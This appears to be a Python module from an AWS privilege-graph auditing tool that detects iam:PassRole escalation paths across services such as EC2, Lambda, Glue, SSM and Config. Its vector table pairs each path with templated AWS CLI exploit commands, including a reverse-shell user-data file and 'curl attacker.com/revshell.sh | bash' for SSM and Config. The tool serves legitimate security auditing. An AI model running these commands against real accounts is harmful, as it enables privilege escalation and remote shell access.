"""Code to identify generic iam:PassRole privilege escalation paths across multiple AWS services."""

import logging
from typing import List, Optional

from principalmapper.common import Edge, Node
from principalmapper.graphing.edge_checker import EdgeChecker
from principalmapper.querying import query_interface
from principalmapper.util import arns

logger = logging.getLogger(__name__)

# Configuration defining the PassRole escalation vectors
# Concept: (Target Service Principal) -> Dictionary of required API actions and their corresponding exploit commands
# To gain privileges over 'Target Service Principal', the attacker needs 'iam:PassRole' on the target role,
# AND all actions in the list.

GENERIC_PASSROLE_VECTORS = {
    'ec2.amazonaws.com': [
        {
            'actions': ['ec2:RunInstances'],
            'exploit_cmds': [
                'aws ec2 run-instances --image-id <ami-id> --instance-type t2.micro --iam-instance-profile Name={target_role_name} --user-data file://revshell.sh --profile attacker'
            ]
        }
    ],
    'lambda.amazonaws.com': [
        {
            'actions': ['lambda:CreateFunction', 'lambda:InvokeFunction'],
            'exploit_cmds': [
                'aws lambda create-function --function-name pmapper-privesc --runtime python3.9 --role {target_role_arn} --handler lambda_function.lambda_handler --zip-file fileb://function.zip --profile attacker',
                'aws lambda invoke --function-name pmapper-privesc out.txt --profile attacker'
            ]
        },
        {
            'actions': ['lambda:UpdateFunctionCode', 'lambda:InvokeFunction'],
            'exploit_cmds': [
                'aws lambda update-function-code --function-name <existing-function-with-target-role> --zip-file fileb://function.zip --profile attacker',
                'aws lambda invoke --function-name <existing-function-with-target-role> out.txt --profile attacker'
            ]
        }
    ],
    'glue.amazonaws.com': [
        {
            'actions': ['glue:CreateDevEndpoint'],
            'exploit_cmds': [
                'aws glue create-dev-endpoint --endpoint-name pmapper-privesc --role-arn {target_role_arn} --public-key file://id_rsa.pub --profile attacker'
            ]
        },
        {
            'actions': ['glue:UpdateDevEndpoint'],
            'exploit_cmds': [
                'aws glue update-dev-endpoint --endpoint-name <existing-endpoint> --custom-libraries "{\\"customConfiguration\\": \\"pmapper\\"}" --add-public-keys file://id_rsa.pub --profile attacker'
            ]
        }
    ],
    'sagemaker.amazonaws.com': [
        {
            'actions': ['sagemaker:CreateNotebookInstance', 'sagemaker:CreatePresignedNotebookInstanceUrl'],
            'exploit_cmds': [
                'aws sagemaker create-notebook-instance --notebook-instance-name pmapper-privesc --instance-type ml.t2.medium --role-arn {target_role_arn} --profile attacker',
                'aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name pmapper-privesc --profile attacker'
            ]
        }
    ],
    'cloudformation.amazonaws.com': [
        {
            'actions': ['cloudformation:CreateStack'],
            'exploit_cmds': [
                'aws cloudformation create-stack --stack-name pmapper-privesc --template-body file://admin-role-template.yml --role-arn {target_role_arn} --profile attacker'
            ]
        }
    ],
    'datapipeline.amazonaws.com': [
        {
            'actions': ['datapipeline:CreatePipeline', 'datapipeline:PutPipelineDefinition', 'datapipeline:ActivatePipeline'],
            'exploit_cmds': [
                'aws datapipeline create-pipeline --name pmapper-privesc --unique-id pmapper-privesc --profile attacker',
                'aws datapipeline put-pipeline-definition --pipeline-id <pipeline-id> --pipeline-definition file://pipeline.json --profile attacker',
                'aws datapipeline activate-pipeline --pipeline-id <pipeline-id> --profile attacker'
            ]
        }
    ],
    'states.amazonaws.com': [
        {
            'actions': ['states:CreateStateMachine', 'states:StartExecution'],
            'exploit_cmds': [
                'aws stepfunctions create-state-machine --name pmapper-privesc --definition file://machine.json --role-arn {target_role_arn} --profile attacker',
                'aws stepfunctions start-execution --state-machine-arn <state-machine-arn> --profile attacker'
            ]
        }
    ],
    'apigateway.amazonaws.com': [
        {
            'actions': ['apigateway:CreateRestApi', 'apigateway:CreateResource', 'apigateway:PutMethod', 'apigateway:PutIntegration', 'apigateway:CreateDeployment'],
            'exploit_cmds': [
                'aws apigateway create-rest-api --name pmapper-privesc --profile attacker',
                'aws apigateway put-integration --rest-api-id <api-id> --resource-id <resource-id> --http-method GET --type AWS --integration-http-method POST --uri arn:aws:apigateway:<region>:iam:action/PutUserPolicy --credentials {target_role_arn} --profile attacker'
            ]
        }
    ],
    'ssm.amazonaws.com': [
        {
            'actions': ['ssm:RegisterTaskWithMaintenanceWindow'],
            'exploit_cmds': [
                'aws ssm register-task-with-maintenance-window --window-id <window-id> --targets Key=InstanceIds,Values=<instance-id> --task-arn AWS-RunShellScript --service-role-arn {target_role_arn} --task-type RUN_COMMAND --task-invocation-parameters "RunCommand={{Comment=\'pmapper-privesc\',DocumentHashType=Sha256,Parameters={{commands=[\'curl attacker.com/revshell.sh | bash\']}}}}" --profile attacker'
            ]
        }
    ],
    'config.amazonaws.com': [
        {
            'actions': ['config:PutConfigRule', 'config:PutRemediationConfigurations'],
            'exploit_cmds': [
                'aws configservice put-config-rule --config-rule file://rule.json --profile attacker',
                'aws configservice put-remediation-configurations --remediation-configurations "[{{\\"ConfigRuleName\\":\\"pmapper-privesc\\",\\"TargetType\\":\\"SSM_DOCUMENT\\",\\"TargetId\\":\\"AWS-RunShellScript\\",\\"Parameters\\":{{\\"commands\\":{{\\"StaticValue\\":{{\\"Values\\":[\\"curl attacker.com/revshell.sh | bash\\"]}}}}}},\\"TargetVersion\\":\\"1\\",\\"ExecutionControls\\":{{\\"SsmControls\\":{{\\"ConcurrentExecutionRatePercentage\\":100,\\"ErrorPercentage\\":100}}}},\\"Automatic\\":true,\\"MaximumAutomaticAttempts\\":1,\\"RetryAttemptSeconds\\":50}}]" --profile attacker'
            ]
        }
    ]
}


class GenericPassRoleEdgeChecker(EdgeChecker):
    """Class for identifying privilege escalation through generic iam:PassRole vectors."""

    def return_edges(self, nodes: List[Node], region_allow_list: Optional[List[str]] = None,
                     region_deny_list: Optional[List[str]] = None, scps: Optional[List[List[dict]]] = None,
                     client_args_map: Optional[dict] = None) -> List[Edge]:
        """Fulfills expected method return_edges."""

        logger.info('Generating Edges based on Generic PassRole Vectors')
        result = []

        for node_source in nodes:
            # Check if source is admin; admins already have all access
            if node_source.is_admin:
                continue

            for node_destination in nodes:
                # Can only PassRole to Roles
                if not node_destination.arn.startswith('arn:aws:iam::') or ':role/' not in node_destination.arn:
                    continue

                if node_source == node_destination:
                    continue

                # 1. Does node_source have iam:PassRole on node_destination?
                pass_role_res, mfa_res_pr = query_interface.local_check_authorization_handling_mfa(
                    node_source, 'iam:PassRole', node_destination.arn, {}, service_control_policy_groups=scps
                )

                if not pass_role_res:
                    continue

                # 2. What services can node_destination be assumed by?
                # We check the trust policy to see if any of our known services can assume it.
                if not node_destination.trust_policy:
                    continue
                    
                allowed_services = set()
                try:
                    for statement in node_destination.trust_policy.get('Statement', []):
                        if statement.get('Effect') == 'Allow':
                            principal = statement.get('Principal', {})
                            if 'Service' in principal:
                                svc = principal['Service']
                                if isinstance(svc, str):
                                    allowed_services.add(svc)
                                elif isinstance(svc, list):
                                    allowed_services.update(svc)
                except Exception as e:
                    logger.debug(f'Error parsing trust policy for {node_destination.arn}: {e}')
                    continue

                # 3. For each allowed service, check if node_source has the required vector actions
                for service in allowed_services:
                    if service in GENERIC_PASSROLE_VECTORS:
                        vectors = GENERIC_PASSROLE_VECTORS[service]
                        for vector in vectors:
                            actions = vector['actions']
                            
                            # Check if the source has ALL required actions
                            can_execute_vector = True
                            mfa_required = mfa_res_pr
                            
                            for action in actions:
                                action_res, mfa_res_act = query_interface.local_check_authorization_handling_mfa(
                                    node_source, action, '*', {}, service_control_policy_groups=scps
                                )
                                if not action_res:
                                    can_execute_vector = False
                                    break
                                if mfa_res_act:
                                    mfa_required = True
                                    
                            if can_execute_vector:
                                target_role_name = arns.get_resource(node_destination.arn).split('/')[-1]
                                
                                reason = f'can execute {", ".join(actions)} and pass the role to {service}'
                                if mfa_required:
                                    reason = '(MFA required) ' + reason
                                    
                                exploit_cmds_raw = vector['exploit_cmds']
                                exploit_cmds = [
                                    cmd.format(target_role_name=target_role_name, target_role_arn=node_destination.arn) 
                                    for cmd in exploit_cmds_raw
                                ]
                                
                                edge = Edge(node_source, node_destination, reason, 'PassRole_Generic', exploit_cmds)
                                result.append(edge)
                                logger.info(f"Found new PassRole edge: {edge.describe_edge()}")
                                break # One vector per service is enough to establish the edge

        return result
